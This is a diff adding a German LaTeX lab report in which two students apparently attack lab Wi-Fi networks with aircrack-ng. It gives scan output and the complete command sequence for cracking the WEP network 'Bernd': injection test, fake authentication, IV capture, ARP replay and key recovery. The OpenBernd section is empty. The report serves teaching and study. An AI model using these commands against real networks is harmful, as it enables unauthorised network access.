@@ -1,0 +1,47 @@
+\documentclass[10pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{todo}
+\usepackage[ngerman]{babel}
+\usepackage[left=2cm]{geometry}
+\author{Christoph Robbert 6577945, Peter Stilow 6500440}
+\title{Protokoll 1 - WLAN}
+\begin{document}
+\maketitle
+ 
+\section{Aufgabe 1}
+
+Wir verwenden in dieser Aufgabe aircrack-ng um in die WLANs einzudringen. Die WLAN-Karte hat in dieser Aufgabe die Bezeichnung \texttt{wlan1}
+Nachdem wir die WLAN-Karte laut aircrack-ng Tutorial eingerichtet haben, bringen wir sie mittels
+\texttt{airmon-ng start wlan1} in den Monitormode. Mittels \texttt{airodump-ng mon7} haben wir folgende Channels und BSSIDs bestimmt:
+\begin{verbatim}
+BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                 
+                                                                                                                                                                                
+ 64:70:02:1C:4F:13  -22       32        0    0   3  54   WPA2 CCMP   PSK  SecureBernd                                                                                           
+ 64:70:02:1A:B1:81  -25       41        0    0   2  54   WEP  WEP         Bernd                                                                                                 
+ 64:70:02:1C:4F:3A  -26       62        0    0   1  54   OPN              OpenBernd                                                                                             
+....(Die gleichen Daten für einige webauth und eduroam Access Points.)....
+\end{verbatim}
+Die MAC Adresse der benutzten WLAN Karte lautet ist \texttt{00:C0:CA:55:54:5F}.
+Die Daten zeigen, dass SecureBernd im WPA2 Modus betrieben wird, Bernd mittels WEP gesichert ist und das Netzwerk OpenBernd nicht gesichert ist. Ein erster Verbindungsversuch zu OpenBernd scheitert. Anscheinend wird eine Zugangskontrolle mittels MAC Filter vorgenommen. Da uns kein Angriff auf WPA2 bekannt ist, konzentrieren wir uns auf die Netzwerke OpenBernd und Bernd.
+
+\subsection{Angriff auf OpenBernd}
+
+\subsection{Angriff auf Bernd}
+
+Als erstes haben wir mit dem Kommando \texttt{aireplay-ng --test -e Bernd -a 64:70:02:1A:B1:81 --ignore-negative-one wlan1} überprüft, ob wir in das Netzwerk Bernd Packete injizieren können.
+Da unser Client nicht am Access Point authentifiziert ist, führen wir mittels \texttt{aireplay-ng  -1 0 -e Bernd -a 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F --ignore-negative-one wlan1} eine Fakeauthentifizierung durch.
+
+IVs mitschneiden: \texttt{airodump-ng -c 2 --bssid 64:70:02:1A:B1:81 -w output wlan1}
+
+ARP Replay:  \texttt{aireplay-ng -3 -b 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F wlan1}
+
+Aus den Abgefangen Packeten den IV berechnen: \texttt{aircrack-ng -b 64:70:02:1A:B1:81 output*.cap}
+
+
+TODO: Link entfernen: 
+%http://www.aircrack-ng.org/doku.php?id=simple_wep_crack#step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel
+\end{document}
